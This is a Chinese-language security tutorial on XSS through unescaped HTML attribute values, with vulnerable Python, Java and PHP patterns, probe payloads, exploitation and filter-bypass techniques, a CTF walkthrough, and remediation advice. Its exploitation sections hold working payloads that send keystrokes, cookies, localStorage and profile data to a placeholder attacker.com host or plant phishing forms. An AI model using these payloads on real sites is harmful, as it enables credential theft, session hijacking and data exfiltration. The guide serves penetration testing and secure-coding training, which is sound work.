# HTML 属性上下文 XSS 注入攻击

## 1. 技术概述

### 1.1 漏洞原理

HTML 属性上下文 XSS 注入是指用户输入被直接反射到 HTML 标签的属性值中（如 `value`、`src`、`href` 等），且未进行适当的 HTML 实体编码，导致攻击者可以通过注入双引号或其他特殊字符逃逸出属性上下文，进而注入恶意事件处理器或 HTML 标签。

**本质**：应用层代码将用户输入作为 HTML 属性值的一部分进行输出，违背了"数据与代码分离"的原则。

### 1.2 适用范围

- 所有将用户输入反射到 HTML 属性上下文的 Web 应用
- 使用字符串拼接/格式化生成 HTML 的应用（如 Python `.format()`、C# 字符串拼接）
- 未使用模板引擎自动 escaping 功能的场景
- CTF 挑战、培训环境等故意脆弱的应用

### 1.3 读者对象

- 执行渗透测试任务的安全工程师
- 进行代码审计的安全分析师
- Web 应用开发人员

---

## 2. 攻击场景

### 2.1 常见业务场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 搜索功能 | 搜索框回显用户关键词 | 搜索词反射到 `value` 属性 |
| 表单回显 | 表单字段预填充用户输入 | 用户输入反射到 `value`/`checked` 属性 |
| URL 参数回显 | 页面显示 URL 参数内容 | 参数值反射到 HTML 属性或 body |
| 用户名显示 | 页面显示当前用户名 | 用户名反射到任意 HTML 上下文 |
| 错误消息 | 显示包含用户输入的错误信息 | 错误消息反射到 HTML 中 |

### 2.2 危险代码模式

**Python Flask 危险模式：**
```python
# 危险代码示例 1：使用 .format() 直接拼接
value = 'value="{0}"'.format(user_input)  # 无 HTML 编码
page = '<input type=text name=name {0}>'.format(value)

# 危险代码示例 2：使用 f-string 拼接
value = f'value="{user_input}"'  # 无 HTML 编码

# 危险代码示例 3：使用 % 格式化
value = 'value="%s"' % user_input  # 无 HTML 编码
```

**Java Servlet 危险模式：**
```java
// 危险代码示例
String value = "value=\"" + userInput + "\"";  // 无 HTML 编码
out.println("<input type=text name=name " + value + ">");
```

**PHP 危险模式：**
```php
// 危险代码示例
$value = 'value="' . $_GET['name'] . '"';  // 无 htmlspecialchars
echo "<input type=text name=name $value>";
```

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

抓取所有与后端交互的请求，重点关注：
- URL 查询参数（`?name=`, `?q=`, `?search=`）
- POST 表单数据
- HTTP 头部值（Referer, User-Agent, X-Forwarded-For）
- Cookie 值

**识别特征：**
- 参数值在响应 HTML 中原样出现
- 参数值出现在 HTML 标签的属性位置
- 响应 Content-Type 为 `text/html`

#### 3.1.2 初步探测 Payload

使用以下 Payload 测试 HTML 属性逃逸可能性：

```
# 测试双引号是否被编码
"><img src=x onerror=alert(1)>

# 测试单引号是否被编码
'><img src=x onerror=alert(1)>

# 测试无引号上下文
<img src=x onerror=alert(1)>

# 测试事件处理器注入
" onfocus="alert(1)" autofocus="

# 测试标签闭合
></input><script>alert(1)</script>
```

#### 3.1.3 结果验证

**JavaScript 执行确认：**
- 观察是否弹出 alert 对话框
- 检查浏览器开发者工具 Console 是否有错误
- 使用 `alert(document.domain)` 确认执行上下文

**HTML 结构验证：**
- 查看响应源码，确认注入的 HTML 标签是否完整
- 检查属性值是否正确闭合
- 确认事件处理器是否被保留

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下危险模式：

**Python:**
- `.format(` 用于生成 HTML
- `f'...'` 或 `f"..."` 生成 HTML
- `%s` 格式化生成 HTML
- `cgi.escape()` 缺失或 `quote=False`

**Java:**
- 字符串拼接生成 HTML
- `PrintWriter.println()` 输出用户输入
- 缺失 `StringEscapeUtils.escapeHtml4()`

**PHP:**
- 直接输出 `$_GET`/`$_POST`/`$_REQUEST`
- 缺失 `htmlspecialchars()` 或 `htmlentities()`

#### 3.2.2 数据流追踪

检查用户输入是否：
1. 从 HTTP 请求提取（`request.args.get()`, `$_GET[]`）
2. 经过过滤/编码处理
3. 被嵌入到 HTML 属性上下文中
4. 最终输出到 HTTP 响应

---

## 4. 漏洞利用方法

### 4.1 基础利用技术

#### 4.1.1 双引号属性逃逸

当属性值使用双引号包裹且双引号未被过滤时：

```html
<!-- 原始 HTML -->
<input type=text name=name value="USER_INPUT">

<!-- Payload: " onfocus="alert(1)" autofocus=" -->
<input type=text name=name value="" onfocus="alert(1)" autofocus="">
```

**利用要点：**
- 使用 `autofocus` 属性自动触发 `onfocus` 事件
- 无需用户交互即可执行 JavaScript

#### 4.1.2 单引号属性逃逸

当属性值使用单引号包裹且单引号未被过滤时：

```html
<!-- Payload: ' onfocus='alert(1)' autofocus=' -->
<input type=text name=name value='' onfocus='alert(1)' autofocus='>
```

#### 4.1.3 无引号上下文注入

当属性值未使用引号包裹时：

```html
<!-- 原始 HTML -->
<input type=text name=name value=USER_INPUT>

<!-- Payload: x onerror=alert(1) -->
<input type=text name=name value=x onerror=alert(1)>
```

### 4.2 高级利用技术

#### 4.2.1 标签注入

完全注入新的 HTML 标签：

```
Payload: "><script>alert(document.cookie)</script><input "

Result:
<input type=text name=name value=""><script>alert(document.cookie)</script><input ">
```

#### 4.2.2 事件处理器大全

根据 HTML 上下文选择合适的事件处理器：

| 事件处理器 | 触发条件 | 自动触发 |
|-----------|---------|---------|
| `onfocus` | 元素获得焦点 | 配合 `autofocus` |
| `onblur` | 元素失去焦点 | 否 |
| `onclick` | 元素被点击 | 否 |
| `onmouseover` | 鼠标悬停 | 否 |
| `onerror` | 资源加载失败 | 是（如 `<img src=x>`） |
| `onload` | 资源加载完成 | 是（如 `<body>`） |
| `onanimationstart` | CSS 动画开始 | 是 |

#### 4.2.3 DOM 操作 Payload

```javascript
// 页面 defacement
"><img src=x onerror="document.body.innerHTML='<h1>XSS</h1>'">

// 创建钓鱼表单
"><script>
document.body.innerHTML = '<form action="http://attacker.com/steal">' +
  '<input name=user placeholder=Username>' +
  '<input name=pass type=password>' +
  '<button>Login</button></form>';
</script><input "

// 数据 exfiltration
"><img src="http://attacker.com/steal.jpg?data=" + document.body.innerHTML>
```

### 4.3 后利用技术

#### 4.3.1 凭证窃取

```javascript
// 创建假登录表单
var form = document.createElement('form');
form.action = 'http://attacker.com/phish';
form.method = 'GET';
form.innerHTML = '<input name=user><input name=pass type=password><button>Login</button>';
document.body.appendChild(form);
```

#### 4.3.2 键盘记录

```javascript
document.addEventListener('keypress', function(e) {
  fetch('http://attacker.com/log?key=' + encodeURIComponent(e.key));
});
```

#### 4.3.3 会话劫持

```javascript
// 窃取 Cookie（如果存在）
fetch('http://attacker.com/steal?cookie=' + document.cookie);

// 或窃取 localStorage
fetch('http://attacker.com/steal?data=' + localStorage.getItem('sensitive_key'));
```

---

## 5. 绕过技术

### 5.1 弱黑名单绕过

#### 5.1.1 仅过滤 `"XSS"` 或 `'XSS'`

```python
# 弱过滤示例
msg = re.sub(r"""["']XSS["']""", "", msg, flags=re.IGNORECASE)
```

**绕过方法：**
- 不使用 "XSS" 字符串
- 使用其他 Payload：`alert(1)`, `alert(document.domain)`
- 使用事件处理器：`onfocus`, `onerror`

#### 5.1.2 仅过滤 `<script>` 标签

**绕过方法：**
- 使用 `<img>` 标签：`<img src=x onerror=alert(1)>`
- 使用 `<svg>` 标签：`<svg/onload=alert(1)>`
- 使用事件处理器注入：`" onfocus="alert(1)`

### 5.2 编码绕过

#### 5.2.1 HTML 实体编码绕过

如果应用对部分字符编码：

```
双引号 " → &quot; 或 &#34;
单引号 ' → &#39;
小于号 < → &lt;
大于号 > → &gt;
```

**绕过方法：**
- 使用反引号：`` `XSS` ``（某些上下文）
- 使用 Tab/换行代替空格
- 使用 Unicode 编码

#### 5.2.2 URL 编码绕过

```
空格 → %20 或 +
双引号 → %22
单引号 → %27
```

### 5.3 上下文绕过

#### 5.3.1 JavaScript 字符串上下文

如果输入被反射到 JavaScript 字符串中：

```javascript
var msg = 'USER_INPUT';
```

**Payload:**
```
'; alert(1); var x = '
```

**Result:**
```javascript
var msg = ''; alert(1); var x = '';
```

---

## 6. 实战案例

### 6.1 Flask + PhantomJS XSS 挑战

**目标环境：**
- Flask 应用运行在 `http://localhost:34545`
- `/page?name=` 参数存在 XSS
- 弱过滤仅移除 `"XSS"` 和 `'XSS'`
- PhantomJS 用于验证 XSS

**利用步骤：**

1. **确认 JavaScript 执行：**
```bash
curl -s 'http://localhost:34545/page?name=%22%20onfocus=%22alert(1)%22%20autofocus=%22'
```

2. **获取 Flag（如果挑战要求）：**
```javascript
// Payload
"><script>
fetch('/page?name=test')
  .then(r => r.text())
  .then(t => alert(t.match(/flag\{[^}]+\}/)[0]));
</script><input "
```

3. **DOM Defacement 证明：**
```javascript
"><img src=x onerror="document.body.innerHTML='<h1>XSS by Attacker</h1>'">
```

### 6.2 真实世界案例

**场景：** 电商网站搜索功能

**漏洞点：**
```
https://example.com/search?q=USER_INPUT
```

**利用：**
```
"><script>
fetch('/api/user/profile')
  .then(r => r.json())
  .then(d => fetch('http://attacker.com/steal?data=' + JSON.stringify(d)));
</script><input "
```

---

## 7. 检测清单

### 7.1 自动化检测

- [ ] 使用 Burp Suite Scanner 扫描 XSS
- [ ] 使用 OWASP ZAP 进行被动/主动扫描
- [ ] 使用 XSStrike 进行高级 XSS 检测
- [ ] 使用 dalfox 进行快速 XSS 扫描

### 7.2 手工检测

- [ ] 测试所有输入点是否反射到 HTML
- [ ] 测试 HTML 属性上下文是否可逃逸
- [ ] 测试事件处理器是否可注入
- [ ] 测试弱黑名单是否可绕过
- [ ] 确认 JavaScript 执行成功

---

## 8. 修复建议

### 8.1 输出编码

**Python Flask:**
```python
from markupsafe import escape

# 安全代码
value = 'value="{}"'.format(escape(user_input, quote=True))
```

**Java:**
```java
import org.apache.commons.text.StringEscapeUtils;

// 安全代码
String value = "value=\"" + StringEscapeUtils.escapeHtml4(userInput) + "\"";
```

**PHP:**
```php
// 安全代码
$value = 'value="' . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . '"';
```

### 8.2 使用模板引擎

**Jinja2 (Flask):**
```python
from jinja2 import Template

template = Template('<input value="{{ name }}">')
page = template.render(name=user_input)  # 自动 escaping
```

### 8.3 添加 Content Security Policy

```python
@app.after_request
def set_csp(response):
    response.headers['Content-Security-Policy'] = "default-src 'self'; script-src 'none'"
    return response
```

---

## 9. 参考资源

- [OWASP XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [PortSwigger - XSS](https://portswigger.net/web-security/cross-site-scripting)
- [HTML5 Security Cheat Sheet](https://html5sec.org/)
